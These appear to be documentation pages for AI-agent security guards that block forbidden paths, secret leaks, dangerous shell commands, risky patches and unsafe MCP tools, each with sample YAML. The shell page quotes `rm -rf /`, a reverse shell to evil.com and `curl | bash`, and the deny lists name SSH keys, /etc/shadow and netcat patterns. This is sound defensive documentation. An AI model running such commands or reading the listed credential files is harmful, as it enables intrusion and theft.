**01-forbidden-path/page.mdx**

```yaml
---
title: "Forbidden Path Guard"
order: 1
track: "guard-gallery"
description: "Blocks access to sensitive filesystem paths like SSH keys and credentials"
---
```

**The Threat**: AI agents with filesystem access can read SSH private keys, cloud credentials, environment files, Docker sockets, and other sensitive paths. Even "helpful" agents might access `~/.ssh/id_rsa` if asked to debug an SSH connection. The ForbiddenPathGuard blocks access to a configurable set of glob patterns.

**How It Works**: The guard normalizes the requested path using BOTH lexical normalization (resolving `..` segments textually) AND filesystem-aware normalization (resolving symlinks). It then checks the path against a set of forbidden glob patterns using globset matching. If EITHER the lexical or resolved path matches a forbidden pattern, access is denied. This dual-check prevents symlink-based bypasses. The guard also supports an exceptions list -- paths that are allowed even if they match a forbidden pattern.

**Configuration** -- YAML code block:
```yaml
guards:
  forbidden_path:
    enabled: true
    forbidden_patterns:
      - "**/.ssh/**"
      - "**/.aws/**"
      - "**/.env"
      - "**/etc/shadow"
      - "**/etc/passwd"
    exceptions:
      - "**/known_hosts"
```

**02-path-allowlist/page.mdx**

```yaml
---
title: "Path Allowlist Guard"
order: 2
track: "guard-gallery"
description: "Deny-by-default filesystem access — only explicitly allowed paths pass"
---
```

**The Threat**: The inverse of ForbiddenPath. Instead of blocking known-bad paths, PathAllowlistGuard blocks EVERYTHING except explicitly allowed paths. This is the "deny by default" approach -- if a path isn't on the allowlist, it's denied.

**How It Works**: The guard maintains separate allowlists for file_access (reads), file_write, and patch operations. When checking an action, it dispatches to the appropriate allowlist based on action type. If no file_write_allow is configured, it falls back to file_access_allow. If no patch_allow is configured, it falls back to file_write_allow. For symlink-aware matching, when the resolved path differs from the lexical path, ONLY the resolved path is checked -- this prevents allowlist escapes via symlinks.

**Configuration**:
```yaml
guards:
  path_allowlist:
    enabled: true
    file_access_allow:
      - "**/repo/src/**"
      - "**/repo/docs/**"
    file_write_allow:
      - "**/repo/src/**"
    patch_allow: []  # Falls back to file_write_allow
```

**04-secret-leak/page.mdx**

```yaml
---
title: "Secret Leak Guard"
order: 4
track: "guard-gallery"
description: "Detects API keys, tokens, and credentials in file writes using regex patterns"
---
```

**The Threat**: AI agents that write files can accidentally (or deliberately via prompt injection) embed API keys, cloud credentials, private keys, and tokens in their output. Even writing a "helpful" configuration file might leak `OPENAI_API_KEY=sk-...` or embed an AWS secret. The SecretLeakGuard scans file content for 18 secret patterns.

**How It Works**: The guard compiles a set of regex patterns at initialization. When a file_write or patch action occurs, it scans the content against all patterns. Each match has an assigned severity (CRITICAL for AWS keys, WARNING for generic secrets). The guard blocks if any match exceeds the configured severity threshold. Matched values are masked in the evidence (showing only first/last characters). Special case: credit card-like patterns also run a Luhn checksum to reduce false positives.

**Configuration**:
```yaml
guards:
  secret_leak:
    enabled: true
    severity_threshold: warning  # block at warning or above
    custom_patterns:
      - name: "internal_token"
        pattern: "int-tok-[A-Za-z0-9]{32}"
        severity: critical
```

**05-shell-command/page.mdx**

```yaml
---
title: "Shell Command Guard"
order: 5
track: "guard-gallery"
description: "Blocks dangerous shell commands like rm -rf, reverse shells, and data exfiltration"
---
```

**The Threat**: Shell access is the most dangerous capability an agent can have. A single command can delete files (`rm -rf /`), establish reverse shells (`bash -i >& /dev/tcp/evil.com/4444 0>&1`), exfiltrate data (`curl | bash`), or crash the system (fork bombs). The ShellCommandGuard catches these patterns.

**How It Works**: Two-phase check: First, the guard normalizes quoted pipe characters (`'|'` -> `|`) to prevent evasion via shell quoting, then checks against 6 default forbidden regex patterns. Second, it extracts filesystem paths from the command (handling redirections, `--flag=/path`, tilde expansion) and checks them against the ForbiddenPathGuard's patterns.

**Configuration**:
```yaml
guards:
  shell_command:
    enabled: true
    forbidden_patterns:
      - "rm\\s+-rf\\s+/"
      - "(curl|wget).*\\|.*sh"
      - "nc\\s+-e"
      - "bash.*\\/dev\\/tcp"
    forbidden_path_patterns:
      - "**/.ssh/**"
      - "**/.env"
```

**06-patch-integrity/page.mdx**

```yaml
---
title: "Patch Integrity Guard"
order: 6
track: "guard-gallery"
description: "Analyzes unified diffs for forbidden patterns and suspicious modification ratios"
---
```

**The Threat**: When an agent modifies code via patches (unified diff format), it might inject dangerous code -- `eval()`, `exec()`, `chmod 777`, disable_security, or reverse shell setups. The PatchIntegrityGuard analyzes the diff to catch these patterns and also flags suspicious modification ratios (e.g., a patch that deletes 500 lines but adds only 2).

**How It Works**: The guard parses the unified diff, counting added (+) and deleted (-) lines (skipping `+++`/`---` headers). It checks added lines ONLY against 9 forbidden regex patterns -- deleted code doesn't matter. It also computes an imbalance ratio (|additions - deletions| / max(additions, deletions)) and flags diffs exceeding the threshold.

**Configuration**:
```yaml
guards:
  patch_integrity:
    enabled: true
    max_imbalance_ratio: 0.9
    forbidden_patterns:
      - "eval\\s*\\("
      - "exec\\s*\\("
      - "chmod\\s+777"
      - "disable.*security"
```

**Annotated Source**:

**The Threat**: The Model Context Protocol (MCP) gives AI agents access to external tools. Without restrictions, an agent could invoke `shell_exec` (arbitrary command execution), `raw_file_write` (bypass file guards), or `raw_file_delete` (destructive deletion). The McpToolGuard controls which tools are allowed, which require confirmation, and which are outright blocked.

**How It Works**: Decision cascade with clear precedence: 1) Block set checked first (always wins). 2) Confirmation set checked next (returns RequireConfirmation -- a warn, not deny). 3) If allowlist is non-empty, tool must be in allowlist to pass. 4) If allowlist is empty, fall back to default action. Also enforces a max_args_size limit (default 1MB) using a zero-allocation counting writer.

**Configuration**:
```yaml
guards:
  mcp_tool:
    enabled: true
    blocked_tools:
      - shell_exec
      - run_command
      - raw_file_write
    require_confirmation:
      - file_write
      - file_delete
      - git_push
    allowed_tools: []  # Empty = allow all not blocked
    max_args_size: 1048576  # 1MB
```
